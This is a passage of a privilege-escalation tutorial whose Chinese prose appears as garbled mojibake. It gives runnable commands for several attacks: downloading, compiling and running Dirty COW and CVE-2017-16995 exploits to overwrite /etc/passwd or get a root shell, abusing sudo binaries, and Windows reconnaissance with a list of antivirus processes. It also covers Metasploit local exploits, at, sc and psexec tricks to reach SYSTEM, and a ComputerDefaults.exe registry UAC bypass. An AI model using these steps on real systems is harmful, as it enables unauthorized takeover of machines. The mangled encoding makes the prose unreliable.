å‰é¢æˆ‘ä»¬çŸ¥é“äº†å†™æ—¶å¤åˆ¶æ—¶ä¼šæœ‰ç«æ€æ¡ä»¶æ¼æ´å‘¢ï¼Ÿé‚£ä¹ˆè¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Œè¿™é‡Œä»‹ç»å¦ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œmadvise()ï¼Œè¿™ä¸ªè°ƒç”¨é€šè¿‡æŒ‡å®šç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºMADV_DONOTNEEDå‘Šè¯‰å†…æ ¸ä¸å†éœ€è¦å£°æ˜åœ°å€éƒ¨åˆ†çš„å†…å­˜ï¼Œå†…æ ¸å°†é‡Šæ”¾è¯¥åœ°å€çš„èµ„æºï¼Œè¿›ç¨‹çš„é¡µè¡¨ä¼šé‡æ–°æŒ‡å‘åŸå§‹çš„ç‰©ç†å†…å­˜ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwX2nic1icGlasbNaN3vRUIksw0j8IysNRK7C2zljI2oBEuJXx74oehvsKw/640?wx_fmt=jpeg&from=appmsg "")  
##### æ¼”ç¤ºï¼š  
  
**1ï¼‰ä½¿ç”¨dirty.cè„šæœ¬è¿›è¡Œææƒ**  
  
è¯¥æ¼æ´åˆ©ç”¨dirtycowæ¼æ´çš„pokemonæ¼æ´åˆ©ç”¨ä½œä¸ºåŸºç¡€ï¼Œè‡ªåŠ¨ç”Ÿæˆæ–°çš„passwdè¡Œã€‚è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå°†æç¤ºç”¨æˆ·è¾“å…¥æ–°å¯†ç ã€‚ç„¶åå°†åŸå§‹ /etc/passwd æ–‡ä»¶å¤‡ä»½åˆ° /tmp/passwd.bak å¹¶ç”¨ç”Ÿæˆçš„è¡Œè¦†ç›– root å¸æˆ·ã€‚è¿è¡Œæ¼æ´åˆ©ç”¨åï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿä½¿ç”¨æ–°åˆ›å»ºçš„ç”¨æˆ·ç™»å½•ã€‚  
  
1.ä¸‹è½½/ä¸Šä¼ è¯¥è„šæœ¬åˆ°ç›®æ ‡æœºä¸‹ï¼š  

```
git clone https://github.com/FireFart/dirtycow

```

  
2.ç¼–è¯‘è¯¥è„šæœ¬ï¼š  

```
gcc -pthread dirty.c -o dirty -lcrypt

1.-Wall ä¸€èˆ¬ä½¿ç”¨è¯¥é€‰é¡¹ï¼Œå…è®¸å‘å‡ºGCCèƒ½å¤Ÿæä¾›çš„æ‰€æœ‰æœ‰ç”¨çš„è­¦å‘Š
2.-pedantic å…è®¸å‘å‡ºANSI/ISO Cæ ‡å‡†æ‰€åˆ—å‡ºçš„æ‰€æœ‰è­¦å‘Š
3.-O2ç¼–è¯‘å™¨çš„ä¼˜åŒ–é€‰é¡¹çš„4ä¸ªçº§åˆ«ï¼Œ-O0è¡¨ç¤ºæ²¡æœ‰ä¼˜åŒ–,-O1ä¸ºç¼ºçœå€¼ï¼Œ-O3ä¼˜åŒ–çº§åˆ«æœ€é«˜
4.-std=c++11å°±æ˜¯ç”¨æŒ‰C++2011æ ‡å‡†æ¥ç¼–è¯‘çš„
5.-pthread åœ¨Linuxä¸­è¦ç”¨åˆ°å¤šçº¿ç¨‹æ—¶ï¼Œéœ€è¦é“¾æ¥pthreadåº“
6.-o dcow gccç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶,åå­—ä¸ºdcow
7.-lcrypt æ·»åŠ éœ€è¦çš„å¤–éƒ¨åº“

```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXbkwn2cicPcCnbu1BbqHfrWleXLc51Ab1hASr4r60lSHxfSXk75bhgOg/640?wx_fmt=jpeg&from=appmsg "")  
  
3.æ·»åŠ å¯æ‰§è¡Œæƒé™å¹¶æ‰§è¡Œ  

```
chmod +x ./dirty
./dirty 999999

```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwX4Dhvwic9V78atE5icsv87XMFXvF5jpNVJL8zRZIwWHzljRGZ17hibEOTw/640?wx_fmt=jpeg&from=appmsg "")  
  
2ï¼‰**ä½¿ç”¨CVE-2016-5195ææƒ**  
  
è„šæœ¬  
  
1.ä¸‹è½½è„šæœ¬åˆ°ç›®æ ‡æœºå™¨ï¼š  

```
git clone https://github.com/gbonacini/CVE-2016-5195.git

```

  
2.ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶  

```
ä½¿ç”¨ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
æˆ–è€…ç›´æ¥è¾“å…¥ make è¿›è¡Œ

```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXt82VXC8bh1Ra1tmHe8wHZR0ibl8KRH45YdduewtwPFORhibB6qmukpBQ/640?wx_fmt=jpeg&from=appmsg "")  
  
3.æ‰§è¡Œè„šæœ¬  

```
./dcow -s
./dcow -h

```

#### 4ã€CVE-2017-16995 ubuntuå†…æ ¸æ¼  
  
**1)å½±å“ç‰ˆæœ¬**  

```
Linux Kernel Version 4.14-4.4 ï¼ˆä¸»è¦å½±å“Debianå’ŒUbuntuå‘è¡Œç‰ˆï¼ŒRedhatå’ŒCentOSä¸å—å½±å“ï¼‰

```

  
2)åˆ©ç”¨æ­¥éª¤  

```
Linuxæœ¬åœ°å†…æ ¸ææƒ CVE-2017-16995
ä»ç½‘ä¸Šä¸‹è½½expï¼Œæˆ–è€…kaliå¯¼å‡ºexpä¸Šä¼ åˆ°ææƒä¸»æœºä¸Šã€‚
wget https://github.com/brl/grlh/archive/master.zip
ç¼–è¯‘ï¼š
gcc get-rekt-linux-hardened.c -o exp
gcc 45010.c -o 45010 Â  ç¼–è¯‘
chmod +x 45010 Â  Â  Â  Â  å¢åŠ æƒé™
./45010 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  æ‰§è¡Œè„šæœ¬è¿”å›rootæƒé™shell
id

```

#### 5ã€æ»¥ç”¨sudoå¯¼è‡´çš„ææƒ(éœ€è¦æ™®é€šç”¨æˆ·å¯ä»¥sudoæ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œåˆåsudo ææƒ)  
  
**ä»¥ä¸‹è¿™äº›ç¨‹åºå¦‚æœè¢«é…ç½®ä½¿ç”¨rootæƒé™å¯åŠ¨ï¼Œä¸”è¯¥ç¬¬ä¸‰æ–¹æœåŠ¡æˆ–è€…ç¨‹åºå­˜åœ¨æ¼æ´æˆ–è€…é…ç½®é—®é¢˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¢«åˆ©ç”¨æ¥è·å¾—rootæƒé™**  
ã€‚** å¹¶ä¸”è¿˜è¦çŸ¥é“å½“å‰ç”¨æˆ·çš„å¯†ç  **  
  
å¯ä»¥åˆ©ç”¨sudoææƒçš„å‘½ä»¤å¦‚ä¸‹ ï¼š  

```
wgetã€findã€catã€aptã€zipã€xxdã€timeã€tasksetã€
gitã€sedã€pipã€edã€tmuxã€scpã€perlã€bashã€
lessã€awkã€manã€viã€envã€ftp

```

  
sudoæ˜¯linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œæ˜¯å…è®¸ç³»ç»Ÿç®¡ç†å‘˜è®©æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›æˆ–è€…å…¨éƒ¨çš„rootå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ï¼Œå¦‚haltï¼Œrebootï¼Œsuç­‰ç­‰ã€‚æ¢å¥è¯è¯´é€šè¿‡æ­¤å‘½ä»¤å¯ä»¥è®©érootçš„ç”¨æˆ·è¿è¡Œåªæœ‰rootæ‰æœ‰æƒé™æ‰§è¡Œçš„å‘½ä»¤ã€‚  
  
æ˜¯ä¸æ˜¯æ¯ä¸€ä¸ªæ–°åˆ›å»ºçš„ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨sudoæå‡å‘½ä»¤çš„æƒé™å‘¢ï¼Ÿå¦‚æœä¸æ˜¯é‚£ä¹ˆå“ªäº›ç”¨æˆ·å¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤å‘¢ï¼Ÿè¦æƒ³ä½¿ä¸€ä¸ªç”¨æˆ·å…·æœ‰ä½¿ç”¨sudoçš„èƒ½åŠ›ï¼Œéœ€è¦è®©rootç”¨æˆ·å°†å…¶åå­—ã€å¯ä»¥æ‰§è¡Œçš„ç‰¹å®šå‘½ä»¤ã€æŒ‰ç…§å“ªç§ç”¨æˆ·æˆ–ç”¨æˆ·ç»„çš„èº«ä»½æ‰§è¡Œç­‰ä¿¡æ¯æ³¨å†Œåˆ°/etc/sudoersæ–‡ä»¶ä¸­ï¼Œå³å®Œæˆå¯¹è¯¥ç”¨æˆ·çš„æˆæƒï¼ˆæ­¤æ—¶è¯¥ç”¨æˆ·ç§°ä¸ºâ€œsudoerâ€ï¼‰æ‰å¯ä»¥ã€‚  
  
å½“ä¸€èˆ¬ç”¨æˆ·æ‰§è¡Œç‰¹æ®Šæƒé™æ—¶ï¼Œåœ¨å‘½ä»¤å‰åŠ ä¸Š sudoï¼Œæ­¤æ—¶ç³»ç»Ÿä¼šè®©ä½ è¾“å…¥å¯†ç ä»¥ç¡®è®¤ç»ˆç«¯æœºå‰æ“ä½œçš„æ˜¯ä½ æœ¬äººï¼Œç¡®è®¤åç³»ç»Ÿä¼šå°†è¯¥å‘½ä»¤çš„è¿›ç¨‹ä»¥è¶…çº§ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚  
  
åœ¨ä¸€å®šçš„æ—¶é—´æ®µå†…ï¼Œå†æ¬¡æ‰§è¡Œsudoçš„å‘½ä»¤æ—¶ä¸å†è¯¢é—®å¯†ç ï¼Œè¶…å‡ºæ­¤æ—¶é—´æ®µï¼ˆä¸€èˆ¬ä¸º5åˆ†é’Ÿï¼‰åéœ€è¦å†æ¬¡è¾“å…¥å¯†ç ã€‚  
  
åœ¨Linux/Unixä¸­ï¼Œ/etc/sudoersæ–‡ä»¶æ˜¯sudoæƒé™çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­å‚¨å­˜äº†ä¸€äº›ç”¨æˆ·æˆ–ç»„å¯ä»¥ä»¥rootæƒé™ä½¿ç”¨çš„å‘½ä»¤ã€‚  
  
æŸ¥çœ‹ç”¨æˆ·èƒ½ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤ï¼šåˆ—å‡ºç›®å‰çš„æƒé™  

```
sudo -l

```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwX9raqNWwhek2LQ2Vtr2KCD29ictibMWUanibUSMew9vJAupK09BKnIJpcA/640?wx_fmt=jpeg&from=appmsg "")  
  
è¡¨ç¤ºå…¨å¯ä»¥æ‰§è¡Œ  
### Windows  
#### ä¿¡æ¯æ”¶é›†  

```
systeminfo æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯

hostname ä¸»æœºå

net user æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯

netstat -ano|find &#34;3389&#34; æŸ¥çœ‹æœåŠ¡pidå·

wmic os get caption æŸ¥çœ‹ç³»ç»Ÿå

wmic qfe get Description,HotFixID,InstalledOn æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯

wmic product get name,version æŸ¥çœ‹å½“å‰å®‰è£…ç¨‹åº

wmic service list brief æŸ¥è¯¢æœ¬æœºæœåŠ¡

wmic process list brief æŸ¥è¯¢æœ¬æœºè¿›ç¨‹

net share æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨

netsh firewall show config æŸ¥çœ‹é˜²ç«å¢™é…ç½®

```

#### å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š  

```
360sd.exe 360æ€æ¯’

360tray.exe 360å®æ—¶ä¿æŠ¤

ZhuDongFangYu.exe 360ä¸»åŠ¨é˜²å¾¡

KSafeTray.exe é‡‘å±±å«å£«

SafeDogUpdateCenter.exe å®‰å…¨ç‹—

McAfee McShield.exe McAfee

egui.exe NOD32

AVP.exe å¡å·´æ–¯åŸº

avguard.exe å°çº¢ä¼

bdagent.exe BitDefender

```

#### è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š  
- æœºå™¨çš„ç³»ç»ŸåŠå…¶ç‰ˆæœ¬  
  
- æœºå™¨çš„æ‰“è¡¥ä¸æƒ…å†µ  
  
- æœºå™¨å®‰è£…çš„æœåŠ¡  
  
- æœºå™¨çš„é˜²ç«å¢™ç­–ç•¥é…ç½®  
  
- æœºå™¨çš„é˜²æŠ¤è½¯ä»¶æƒ…å†µ  
  
#### æ¼æ´ç¼–å·æ ¼å¼  
  
ä¾‹å¦‚ï¼šMS08067 --> MSï¼šå¾®è½¯ 08ï¼šå¹´ä»½ 067ï¼š2008å¹´ç¬¬67ä¸ªæ¼æ´  
#### 1ã€åˆ©ç”¨expææƒ  
##### æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ  
  
åˆ©ç”¨ä¸»æœºç”µè„‘çš„ä¿®è¡¥è¡¥ä¸  
  
å¦‚å›¾å¯ä»¥çœ‹åˆ°æˆ‘çš„è¡¥ä¸ç¨‹åº  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXfmngcK3pAvaQnvicUdv1RBm1aVPevgqSgiaGDdMTa3DdrBjKo3qFUtNw/640?wx_fmt=jpeg&from=appmsg "")  
  
å®æˆ˜ä¸­æˆ‘ä»¬getshellåå¯ä»¥åˆ©ç”¨msfææƒã€‚åœ¨msfè¿›è¡Œgetshellåï¼Œè¿›è¡Œä»¥ä¸‹æŒ‡ä»¤  

```
post/windows/gather/enum_patches

éšåä¼šè‡ªåŠ¨åˆ—å‡ºå¯ä»¥ä½¿ç”¨çš„exp

msf > use exploit/windows/local/<æ ¹æ®åˆ—å‡ºçš„åˆ©ç”¨ç¼–å· Â ä¾‹å¦‚ï¼šms13_053_schlamperei >
msf > set SESSION 2
msf > exploit


```

#### 2ã€atå‘½ä»¤çš„åˆ©ç”¨  
  
å› ä¸ºatå‘½ä»¤é»˜è®¤æ˜¯ä»¥systemæƒé™ä¸‹è¿è¡Œçš„  
##### åœ¨Windows2000ã€Windows 2003ã€Windows XP è¿™ä¸‰ç±»ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨atå‘½ä»¤å°†æƒé™æå‡è‡³systemæƒé™ã€‚  
  
é¦–å…ˆäº†è§£ä»€ä¹ˆæ˜¯atå‘½ä»¤  
- 
```
at
```

  
å‘½ä»¤æ˜¯Windowsæ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡å‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒå…è®¸ç”¨æˆ·å®‰æ’åœ¨å°†æ¥çš„æŸä¸ªæ—¶é—´ç‚¹æˆ–åœ¨ç‰¹å®šçš„æ—¶é—´é—´éš”æ‰§è¡Œå‘½ä»¤æˆ–è„šæœ¬ã€‚ä½¿ç”¨
```
at
```

  
å‘½ä»¤ï¼Œå¯ä»¥åœ¨æ²¡æœ‰ç”¨æˆ·ç™»å½•çš„æƒ…å†µä¸‹è¿è¡Œç¨‹åºæˆ–å‘½ä»¤ã€‚  
  
å› ä¸ºatå‘½ä»¤åœ¨win7ã€win8ç­‰é«˜ç‰ˆæœ¬å–æ¶ˆï¼Œä»¥ä¸‹ä¾‹å­æ¥è‡ªäºç½‘ç»œï¼šæœ€å…¨Windowsææƒæ€»ç»“ï¼ˆå»ºè®®æ”¶è—ï¼‰ - éšé£kali - åšå®¢å›­  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXwUnmRCcykooXnEVJjXYia5PlDzJmic6qicRMkeRaHj4UiabGVQd0tATCXQ/640?wx_fmt=jpeg&from=appmsg "")  
  
ä¾‹å¦‚æˆ‘æƒ³åœ¨ä¸€åˆ†é’Ÿåå¼€å¯äº¤äº’å¼å‘½ä»¤æç¤ºç¬¦  

```
at 10:39 /interactive cmd

```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXQH9mEJ2KWic5YDlVaX5uyvtribQK2y2ObCMicnR4IFzRRjmYhware2Acw/640?wx_fmt=jpeg&from=appmsg "")  
  
ä¸€åˆ†é’Ÿåï¼š  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXpGR3sSmXicMHLXgDVeNsUtXh31dsphialzoX0g1GPxoUlsjn4tbxbweA/640?wx_fmt=jpeg&from=appmsg "")  
  
å¦‚å›¾å·²ç»æ˜¯systemçš„æƒé™ï¼Œä½†åªæ˜¯cmdä¸­çš„systemçš„æƒé™ï¼Œå½“å‰ç”µè„‘ä½¿ç”¨è€…è¿˜æ˜¯æ™®é€šç”¨æˆ·ï¼Œä¸ºäº†å®Œå…¨ææƒï¼Œæˆ‘ä»¬å¯ä»¥åœ¨systemçš„cmdé‡Œé¢è¾“å…¥taskmgr.exeæ¥å¯åŠ¨ä»»åŠ¡ç®¡ç†å™¨ï¼Œç„¶åç»“æŸä¹‹å‰çš„æ¡Œé¢è¿›ç¨‹ï¼Œå†é‡æ–°å¼€å¯ä¸€ä¸ªæ¡Œé¢è¿›ç¨‹  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwX4ibKA5bzPJg9Ipvaewt54olibGFOCorV5YfwtbnmO4d7dNwHhSovoLsw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXfJZJBs9icXTYoe7ctcoFwq3oH9ic6QPEvdnKib5jPbg8uo0Y4reN58MoQ/640?wx_fmt=jpeg&from=appmsg "")  
  
æˆ–è€…åˆ©ç”¨msfç”Ÿæˆçš„æœ¨é©¬æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨atå‘½ä»¤è¿è¡Œè¿™ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œåé¢ä¼šè®²åˆ°å¦‚ä½•åˆ©ç”¨  
#### 3ã€scå‘½ä»¤åˆ©ç”¨  
##### é¦–å…ˆæ¥äº†è§£ä»€ä¹ˆæ˜¯scå‘½ä»¤ï¼š  
- 
```
sc
```

  
å‘½ä»¤æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªå¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ (Service Control Manager, SCM) é€šä¿¡ï¼Œä»¥æŸ¥è¯¢æœåŠ¡çŠ¶æ€ä¿¡æ¯ï¼Œæˆ–é…ç½®æœåŠ¡è®¾ç½®ï¼ˆåŒ…æ‹¬æœåŠ¡å¯åŠ¨ç±»å‹ã€æœåŠ¡ä¾èµ–ç­‰ï¼‰ã€‚  
  
- è¯­æ³•  

```
sc [command] [service name] [options]

query: æŸ¥è¯¢æœåŠ¡çš„çŠ¶æ€æˆ–é…ç½®ä¿¡æ¯ã€‚	start: å¯åŠ¨æœåŠ¡ã€‚	stop: åœæ­¢æœåŠ¡ã€‚
config: æ›´æ”¹æœåŠ¡çš„é…ç½®ã€‚ 		 Â  create: åˆ›å»ºæ–°æœåŠ¡ã€‚ Â delete: åˆ é™¤æœåŠ¡ã€‚

ä¾‹å¦‚ï¼Œå°† â€œSpoolerâ€ æœåŠ¡çš„å¯åŠ¨ç±»å‹æ›´æ”¹ä¸ºè‡ªåŠ¨ï¼š
sc config Spooler start= auto

```

  
ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤  

```
sc create systemcmd binPath= &#34;cmd /K start&#34; type= own type= interact

```

  
å¦‚æœæˆåŠŸä¾¿ä¼šå¼€ä¸€ä¸ªæ–°çš„çª—å£ï¼Œå¹¶ä¸”å†æ•²äººå‘½ä»¤  

```
sc start systemcmd

```

  
åˆ™ä¼šæˆä¸ºsystemçš„çª—å£ï¼Œåç»­æ­¥éª¤ä½¿ç”¨ä¹‹å‰çš„æ–¹å¼  
#### 4ã€psexecææƒ  
  
ä»€ä¹ˆæ˜¯**psexec**  
- 
```
psexec
```

  
æ˜¯ä¸€ä¸ªç”± Sysinternalsï¼ˆç°åœ¨å±äº Microsoftï¼‰æä¾›çš„å·¥å…·ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨è¿œç¨‹Windowsè®¡ç®—æœºä¸Šæ‰§è¡Œç¨‹åºã€å‘½ä»¤æˆ–è„šæœ¬ã€‚
```
psexec
```

  
ä½¿ç”¨æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ï¼ˆService Control Manager, SCMï¼‰çš„åŠŸèƒ½æ¥å¯åŠ¨è¿œç¨‹ç³»ç»Ÿä¸Šçš„è¿›ç¨‹ï¼Œè¿™æ„å‘³ç€å®ƒä¸éœ€è¦è¿œç¨‹ç³»ç»Ÿä¸Šè¿è¡Œä»»ä½•åå°æœåŠ¡ã€‚  
  
**å¾®è½¯å®˜æ–¹å·¥å…·åŒ…**  
ï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools  
  
åˆ©ç”¨è¿™ä¸ªå·¥å…·è¿›è¡Œææƒ  

```
psexec.exe -accepteula -s -i -d cmd.exe

psexec.exeï¼šè¿™æ˜¯ Sysinternals å·¥å…·çš„åç§°ï¼Œç”¨äºæ‰§è¡Œè¿œç¨‹è¿›ç¨‹ã€‚
-accepteulaï¼šè¿™ä¸ªå‚æ•°å‘Šè¯‰ psexec è‡ªåŠ¨æ¥å—è½¯ä»¶è®¸å¯åè®®ï¼Œè¿™æ ·åœ¨è¿è¡Œæ—¶å°±ä¸ä¼šå¼¹å‡ºå¯¹è¯æ¡†è¦æ±‚ç”¨æˆ·åŒæ„ã€‚
-sï¼šä»¥ç³»ç»Ÿæƒé™è¿è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚è¿™æ„å‘³ç€ cmd.exe å°†ä»¥æœ¬åœ°ç³»ç»Ÿè´¦æˆ·ï¼ˆé€šå¸¸å…·æœ‰æœ€é«˜æƒé™ï¼‰è¿è¡Œã€‚
-iï¼šåˆ›å»ºä¸€ä¸ªäº¤äº’å¼ä¼šè¯ã€‚è¿™å…è®¸ç”¨æˆ·ä¸ cmd.exe çš„å®ä¾‹è¿›è¡Œäº¤äº’ã€‚
-dï¼šåœ¨åå°è¿è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚è¿™æ„å‘³ç€ psexec å°†å¯åŠ¨ cmd.exeï¼Œä½†ä¸ä¼šç­‰å¾…å®ƒå®Œæˆï¼Œè€Œæ˜¯ç«‹å³è¿”å›å‘½ä»¤æç¤ºç¬¦ã€‚
cmd.exeï¼šè¿™æ˜¯è¦è¿è¡Œçš„ç¨‹åºçš„åç§°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯å‘½ä»¤æç¤ºç¬¦ã€‚

```

#### 5ã€åˆ©ç”¨UACææƒ  
  
ä»€ä¹ˆæ˜¯UACï¼Ÿ  

```
UACï¼ˆUser Account Controlï¼Œç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼‰æ˜¯å¾®è½¯åœ¨Windows VistaåŠä»¥åç‰ˆæœ¬çš„Windowsæ“ä½œç³»ç»Ÿä¸­å¼•å…¥çš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ã€‚å®ƒçš„ä¸»è¦ç›®çš„æ˜¯ä¿æŠ¤ç”µè„‘å…å—æ¶æ„è½¯ä»¶å’Œæœªç»æˆæƒçš„æ›´æ”¹çš„å½±å“ï¼ŒåŒæ—¶ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªæ›´åŠ å®‰å…¨çš„è®¡ç®—ç¯å¢ƒã€‚

```

  
å¦‚å›¾æ‰€ç¤º  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXVyuNJwNebCnVgfII7EY0JWegxbS8KgUWlgGKRLWo6qjnU8feMJC39A/640?wx_fmt=jpeg&from=appmsg "")  
  
**éœ€è¦UACçš„æˆæƒæ‰èƒ½è¿›è¡Œçš„æ“ä½œåˆ—è¡¨å¦‚ä¸‹ï¼š**  
- é…ç½®Windows Update  
  
- å¢åŠ ã€åˆ é™¤è´¦æˆ·  
  
- æ›´æ”¹è´¦æˆ·ç±»å‹  
  
- æ›´æ”¹UACçš„è®¾ç½®  
  
- å®‰è£…ActiveX  
  
- å®‰è£…ã€å¸è½½ç¨‹åº  
  
- å®‰è£…è®¾å¤‡é©±åŠ¨ç¨‹åº  
  
- å°†æ–‡ä»¶ç§»åŠ¨/å¤åˆ¶åˆ°Program Filesæˆ–Windowsç›®å½•ä¸‹  
  
- æŸ¥çœ‹å…¶å®ƒç”¨æˆ·çš„æ–‡ä»¶å¤¹  
  
**UACæœ‰å¦‚ä¸‹å››ç§è®¾ç½®è¦æ±‚ï¼š**  
- å§‹ç»ˆé€šçŸ¥ï¼šè¿™æ˜¯æœ€ä¸¥æ ¼çš„è®¾ç½®ï¼Œæ¯å½“æœ‰ç¨‹åºéœ€è¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶éƒ½ä¼šæç¤ºæœ¬åœ°ç”¨æˆ·  
  
- ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘ï¼šè¿™æ˜¯UACçš„é»˜è®¤è®¾ç½®ã€‚å½“æœ¬åœ°Windowsç¨‹åºè¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶ï¼Œä¸ä¼šé€šçŸ¥ç”¨æˆ·ã€‚ä½†æ˜¯  
  
å½“ç¬¬ä¸‰æ–¹ç¨‹åºè¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶ï¼Œä¼šæç¤ºæœ¬åœ°ç”¨æˆ·  
  
- ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘(ä¸é™ä½æ¡Œé¢çš„äº®åº¦)ï¼šä¸ä¸Šä¸€æ¡è®¾ç½®çš„è¦æ±‚ç›¸åŒï¼Œä½†åœ¨æç¤ºç”¨æˆ·æ—¶ä¸é™ä½æ¡Œé¢çš„äº®åº¦  
  
- ä»ä¸æç¤ºï¼šå½“ç”¨æˆ·ä¸ºç³»ç»Ÿç®¡ç†å‘˜æ—¶ï¼Œæ‰€æœ‰ç¨‹åºéƒ½ä¼šä»¥æœ€é«˜æƒé™è¿è¡Œ  
  
##### å¦‚ä½•bypass  
  
æˆ‘ä»¬å¯ä»¥æ‰¾ä¸€äº›ä»¥é«˜æƒé™è¿è¡Œçš„ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰uacæç¤ºçš„è¿›ç¨‹ï¼Œç„¶ååˆ©ç”¨ProcessMonitorå¯»æ‰¾ä»–å¯åŠ¨è°ƒç”¨å´ç¼ºå¤±çš„å¦‚dllã€æ³¨å†Œè¡¨é”®å€¼ï¼Œç„¶åæˆ‘ä»¬æ·»åŠ å¯¹åº”çš„å€¼è¾¾åˆ°bypass uacçš„æ•ˆæœã€‚  
  
ä»¥é«˜æƒé™è¿è¡Œçš„è¿›ç¨‹å›¾æ ‡ä¸€èˆ¬æœ‰å¦‚ä¸‹æ ‡å¿—ï¼š  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXXWpyia63ibElHgryAJNsiacv2qp6KXNOdpbbOv37UtMbGbic16MNtj1U3w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
æˆ‘ä»¬win10ä»¥ComputerDefaults.exeä½œä¸ºbypassæ¡ˆä¾‹ï¼ŒComputerDefaults.exeè¿›ç¨‹å›¾æ ‡ç¡®å®æœ‰ä¸ªuacçš„æ ‡å¿—ï¼ˆç„¶åä½ åŒå‡»æ‰“å¼€ä¼šå‘ç°å¹¶æ²¡æœ‰uacæé†’ï¼‰  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXyiczUYQdXDUI5sgor3rUObvLY7xASqWe0D5hffQdbVFcvbpicKDXI3Vw/640?wx_fmt=jpeg&from=appmsg "")  
  
æˆ‘ä»¬åˆ©ç”¨**ProcessMonitor**  
å¯¹è¯¥è¿›ç¨‹çš„è¡Œä¸ºåšä¸€ä¸ªç›‘å¬ï¼š  
  
å…ˆå¯»æ‰¾**HKCU:\Software\Classes\ms-settings\Shell\Open\Command**  
æ³¨å†Œè¡¨ï¼Œç„¶åå‘ç°é”®å€¼ä¸å­˜åœ¨ï¼Œå†å¯»æ‰¾**HKCR:\ms-settings\Shell\Open\Command\DelegateExecute**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXoDNKC7JicalIkgrwm8YHmmeeuYbXe7sBNrz4LgBzrI3ibryxXGo19sUw/640?wx_fmt=jpeg&from=appmsg "")  
  
